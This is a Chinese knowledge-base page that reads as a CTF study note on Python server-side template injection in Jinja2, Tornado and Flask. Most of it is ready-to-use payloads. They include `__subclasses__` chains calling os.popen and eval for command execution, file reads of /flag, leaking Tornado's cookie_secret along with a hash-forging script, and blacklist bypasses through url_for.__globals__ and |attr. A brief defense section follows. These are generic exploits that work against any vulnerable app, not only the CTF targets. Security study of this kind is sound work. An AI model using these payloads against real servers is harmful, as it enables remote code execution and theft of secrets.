---
title: Python SSTI 多引擎利用与黑名单绕过技巧
description: 系统梳理 Jinja2、Tornado、Flask 三大 Python 模板引擎的 SSTI 利用与黑名单绕过技巧，覆盖 {{handler.settings}}
  泄露 cookie_secret、url_for/get_flashed_messages 绕过 config/self 黑名单、__class__.__mro__.__subclasses__()
  通用调用链等实战 Payload
category: program-analysis
tags:
- Python
- SSTI
- Jinja2
- Tornado
- Flask
- 模板注入
- 黑名单绕过
- CTF
- 攻防世界
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

服务器端模板注入（SSTI）是指攻击者能够使用本机模板语法将恶意有效负载注入模板中，然后在服务器端执行该模板。类比 SQL 注入，SSTI 也是获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行。主要针对 Python、PHP、Java 的一些网站处理框架。

**常见 Python 模板引擎**：Jinja2、Mako、Tornado、Django

**危害**：可能导致敏感信息泄露、代码执行、GetShell 等问题

## Jinja2 模板引擎 SSTI

### 基础语法

| 语法 | 说明 |
|------|------|
| `{{ ... }}` | 装载一个变量，模板渲染时使用传入的同名参数替换 |
| `{# ... #}` | 装载一个注释，模板渲染时会忽略中间的值 |
| `{% ... %}` | 控制结构（循环、条件判断等） |

### 通用调用链：`__class__.__mro__.__subclasses__()`

Jinja2 环境下最通用的利用链，通过访问对象基类遍历所有子类找到可利用的 gadget。

#### 核心 Payload

```jinja2
# 列出所有子类及索引
{{ [].__class__.__base__.__subclasses__() }}

# 典型利用链：site._Printer (索引 71) 或 warnings.catch_warnings (索引 59)
{{ [].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat flag').read() }}
```

#### 自动化搜索 Payload（攻防世界 `Web_python_template_injection`）

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.__globals__.values() %}
{% if b.__class__ == {}.__class__ %}
{% if 'eval' in b.keys() %}
{{ b['eval']('__import__("os").popen("ls").read()') }}
{% endif %}
{% endif %}
{% endfor %}
{% endif %}
{% endfor %}
```

> **实战案例**：[[attack-defense-world-master-advanced-writeup]] 中 `Web_python_template_injection` 题目即为 Jinja2 环境，利用 `catch_warnings` 类调用 `os.popen` 读取 flag。

### 进阶利用技巧

- **文件读取**：`{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}`（Flask 环境）
- **命令执行**：`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
- **绕过过滤**：使用 `|attr` 过滤器、`|string` 拼接、`request.args.xxx` 传参

## Tornado 模板引擎 SSTI

### 框架特性

Tornado 是 Python 编写的 Web 服务器兼 Web 应用框架。其模板语法与 Jinja2 类似，但对象模型不同。

### 关键信息泄露：`{{ handler.settings }}`

在 Tornado 中，`RequestHandler` 对象可通过 `handler` 访问。`handler.settings` 指向 `Application.settings`，其中包含 `cookie_secret` 等敏感配置。

> **实战案例**：[[attack-defense-world-master-advanced-writeup]] 中 `easytornado` 题目

#### 利用流程

1. **探测模板注入点**
   ```http
   GET /error?msg={{ 8*8 }}
   ```

2. **泄露 `cookie_secret`**
   ```http
   GET /error?msg={{ handler.settings }}
   ```
   返回包含 `"cookie_secret": "xxxxxxxx"` 的字典。

3. **构造文件读取签名**
   - 目标文件：`/fllllllllllllag`
   - 计算 `filehash = md5(md5(filename) + cookie_secret)`
   - 访问 `/file?filename=/fllllllllllllag&filehash=<计算值>`

#### 完整利用脚本示例

```python
import hashlib

cookie_secret = "泄露的cookie_secret值"
filename = "/fllllllllllllag"

# Tornado 逻辑：md5(md5(filename) + cookie_secret)
inner_md5 = hashlib.md5(filename.encode()).hexdigest()
filehash = hashlib.md5((inner_md5 + cookie_secret).encode()).hexdigest()

print(f"filehash: {filehash}")
# 访问 /file?filename=/fllllllllllllag&filehash={filehash}
```

## Flask 模板引擎 SSTI 与黑名单绕过

### 内置全局对象

Flask 模板上下文中自动注入以下对象，可直接调用：

| 对象 | 说明 |
|------|------|
| `config` | 当前配置对象 (`flask.config.Config`) |
| `request` | 当前请求对象 |
| `session` | 会话对象 |
| `g` | 请求级全局变量 |
| `url_for` | URL 构建函数，**可访问 `__globals__`** |
| `get_flashed_messages` | 闪现消息获取函数，**可访问 `__globals__`** |

### 黑名单绕过案例：`shrine` 题目

> **实战案例**：[[attack-defense-world-master-advanced-writeup]] 中 `shrine` 题目

#### 过滤规则分析

```python
def safe_jinja(s):
    s = s.replace('(', '').replace(')', '')  # 过滤括号
    blacklist = ['config', 'self']            # 黑名单
    return ''.join(['{{% set {}=None %}}'.format(c) for c in blacklist]) + s
```

- 括号 `()` 被替换为空 → 无法直接调用 `__subclasses__()`
- `config` 和 `self` 被设为 `None` → 无法直接访问

#### 绕过思路

1. **黑名单匹配是精确匹配**：`XXX.config` 不会被替换
2. **利用 Flask 内置函数访问 `__globals__`**：
   - `url_for.__globals__`
   - `get_flashed_messages.__globals__`

#### 核心 Payload

```jinja2
# 1. 获取 current_app 配置对象（绕过 config 黑名单）
{{ url_for.__globals__.current_app.config }}

# 2. 读取环境变量 FLAG
{{ url_for.__globals__.current_app.config.FLAG }}

# 3. 或者通过 get_flashed_messages
{{ get_flashed_messages.__globals__.current_app.config.FLAG }}
```

#### 进阶：无括号调用 `__subclasses__`

由于 `()` 被过滤，可利用 Jinja2 的 `|attr` 过滤器或 `[]` 语法：

```jinja2
# 使用 |attr 调用方法
{{ [].__class__.__base__.__subclasses__|attr('__getitem__')(71) }}

# 使用 request.args 传参绕过
{{ request.args.a|attr(request.args.b) }}  # ?a=[]&b=__class__.__base__.__subclasses__
```

## 三大引擎对比速查表

| 特性 | Jinja2 (Flask 默认) | Tornado | Mako |
|------|---------------------|---------|------|
| 变量输出 | `{{ var }}` | `{{ var }}` | `${ var }` |
| 控制结构 | `{% if %}` | `{% if %}` | `% if` |
| 访问配置 | `config` / `request.config` | `handler.settings` | `context.get('config')` |
| 通用调用链 | `__class__.__mro__.__subclasses__()` | `handler.settings` 信息泄露 | `<% import os; os.system('id') %>` |
| 典型绕过 | `|attr`、`request.args`、内置函数 `__globals__` | `datetime` 模块测试参数 | `%` 指令注入 |

## 实战检测与利用清单

### 快速探测 Payload

```jinja2
# 通用数学运算测试
{{ 7*7 }}
{{ 7*'7' }}  # Jinja2/Tornado: '7777777', Mako: 报错

# 引擎指纹识别
{{ ''.__class__.__mro__ }}           # Jinja2
{{ handler.settings }}               # Tornado
{{ config }} / {{ url_for.__globals__ }}  # Flask
```

### 通用 RCE 链构造步骤

1. **确认注入点与引擎类型**
2. **寻找可控对象**：`[]`、`''`、`{}`、`request`、`handler`、`config`
3. **遍历 `__subclasses__` 定位 gadget**：
   - `subprocess.Popen` / `os.popen` / `os.system`
   - `builtins.__import__('os').popen`
   - `eval` / `exec` 所在命名空间
4. **构造最终 Payload 执行命令/读文件**

### 自动化工具推荐

- **tplmap**：自动化 SSTI 检测与利用
- **SSTImap**：支持多引擎检测
- **Burp Suite 插件**：SSTI Scanner

## 防御建议

1. **沙箱化模板环境**：Jinja2 启用 `SandboxedEnvironment`
2. **禁用危险方法**：移除 `__class__`、`__mro__`、`__subclasses__`、`__globals__` 等属性访问
3. **输入验证与输出编码**：严格校验用户输入，避免直接拼接进模板
4. **最小权限原则**：模板渲染进程降权，禁用 `os`、`subprocess` 等模块
5. **日志审计**：记录模板渲染异常与敏感属性访问

## 相关页面

- [[attack-defense-world-master-advanced-writeup]] — 攻防世界高手进阶区完整 Writeup，含本页面引用的三道 SSTI 题目原始复现过程
- [[php伪协议与反序列化利用]] — PHP 伪协议与反序列化利用技巧，对比不同语言模板/反序列化攻击面
- [[ctf-show-php-command-execution-bypass-techniques]] — PHP 命令执行绕过技术，对比 SSTI 与传统 RCE 的利用差异

## 参考资源

- [细说服务器端模板注入（SSTI）](https://paper.seebug.org/1408/)
- [一篇文章带你理解漏洞之 SSTI 漏洞](https://xz.aliyun.com/t/10243)
- [Jinja2 官方文档 - Sandbox](https://jinja.palletsprojects.com/en/stable/api/#sandbox)
- [Tornado 模板文档](https://www.tornadoweb.org/en/stable/template.html)
- [Flask 模板上下文](https://flask.palletsprojects.com/en/stable/templating/#standard-context)

## 来源

- [0x00实验室-202108-202304_065](../sources/0x00实验室-202108-202304_065.md)
